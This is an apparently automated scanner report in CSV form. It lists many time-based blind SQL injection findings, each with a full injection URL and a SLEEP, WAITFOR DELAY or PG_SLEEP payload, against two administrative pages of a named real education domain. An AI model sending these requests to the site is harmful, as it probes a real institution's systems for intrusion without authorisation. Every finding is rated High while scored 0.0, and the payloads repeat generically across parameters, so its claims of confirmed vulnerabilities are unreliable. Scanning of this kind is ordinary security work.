Type,Severity,Risk Score,URL/Location,Payload,Impact,Remediation
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/controller-of-examinations/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/controller-of-examinations/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/controller-of-examinations/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/controller-of-examinations/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/controller-of-examinations/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/controller-of-examinations/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/controller-of-examinations/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/controller-of-examinations/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/controller-of-examinations/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/controller-of-examinations/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/controller-of-examinations/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/controller-of-examinations/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/controller-of-examinations/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/controller-of-examinations/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/controller-of-examinations/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/controller-of-examinations/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/controller-of-examinations/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/controller-of-examinations/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/controller-of-examinations/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/controller-of-examinations/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/controller-of-examinations/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/controller-of-examinations/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/controller-of-examinations/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/controller-of-examinations/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/controller-of-examinations/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/controller-of-examinations/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/controller-of-examinations/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/controller-of-examinations/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/controller-of-examinations/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/controller-of-examinations/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/controller-of-examinations/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/controller-of-examinations/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/controller-of-examinations/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/controller-of-examinations/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/controller-of-examinations/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/controller-of-examinations/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/controller-of-examinations/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/controller-of-examinations/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/controller-of-examinations/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/controller-of-examinations/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/controller-of-examinations/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/controller-of-examinations/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/controller-of-examinations/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/controller-of-examinations/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/controller-of-examinations/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/controller-of-examinations/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/controller-of-examinations/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/controller-of-examinations/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/controller-of-examinations/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/controller-of-examinations/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/controller-of-examinations/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/controller-of-examinations/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/controller-of-examinations/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/controller-of-examinations/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/controller-of-examinations/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/controller-of-examinations/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/controller-of-examinations/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/controller-of-examinations/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/controller-of-examinations/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/controller-of-examinations/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/controller-of-examinations/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/controller-of-examinations/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/controller-of-examinations/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/controller-of-examinations/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/controller-of-examinations/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/controller-of-examinations/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/controller-of-examinations/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/controller-of-examinations/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/controller-of-examinations/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/controller-of-examinations/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/finance-officer/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/finance-officer/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/finance-officer/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/finance-officer/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/finance-officer/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/finance-officer/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/finance-officer/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/finance-officer/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/finance-officer/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/finance-officer/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/finance-officer/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/finance-officer/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/finance-officer/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/finance-officer/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/finance-officer/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/finance-officer/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/finance-officer/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/finance-officer/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/finance-officer/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/finance-officer/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/finance-officer/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/finance-officer/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/finance-officer/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/finance-officer/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/finance-officer/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/finance-officer/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/finance-officer/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/finance-officer/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/finance-officer/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/finance-officer/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/finance-officer/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
